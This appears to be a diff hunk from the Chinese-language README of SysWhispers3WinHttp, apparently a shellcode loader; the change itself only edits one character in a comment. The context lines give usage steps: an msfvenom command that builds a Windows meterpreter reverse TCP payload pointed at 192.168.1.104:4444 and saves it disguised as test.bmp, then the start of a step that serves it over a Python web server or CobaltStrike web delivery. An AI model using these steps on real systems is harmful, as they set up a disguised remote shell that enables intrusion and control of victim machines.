@@ -8,7 +8,7 @@ SysWhispers3WinHttp 在SysWhispers3基础上增添WinHttp分离加载并使用GC
 ## 0x02 使用：
 
 ```
-// 1. 使用msfvenom生成shellcode（或使用CobaltStrike生成Stageless的shellcode）
+// 1. 使用msfvenom生成shellcode（或使用CobaltStrike生成Stageless之shellcode）
 msfvenom -p windows/meterpreter_reverse_tcp lhost=192.168.1.104 lport=4444 -f raw -o test.bmp
 
 // 2. 使用python3开启Web服务（或使用CobaltStrike之Scripted Web Delivery功能）
